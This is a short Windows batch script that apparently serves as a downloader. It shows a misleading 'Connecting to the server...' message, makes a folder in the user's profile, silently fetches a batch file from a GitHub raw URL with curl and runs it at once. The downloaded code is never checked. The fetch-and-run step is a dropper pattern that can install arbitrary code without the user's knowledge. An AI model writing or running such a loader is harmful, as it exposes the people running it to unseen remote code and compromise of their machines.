@echo off
color a
set "target=C:\Users\%username%\ajotak"
if not exist "%target%" mkdir "%target%" >nul
echo Connecting to the server...
timeout -t 5 /nobreak
curl -L -s -o "%target%\ajotak.bat" https://raw.githubusercontent.com/beeczxd/ajotakv2/main/ajeotak.bat
start %target%\ajotak.bat
pause >nul
exit /b
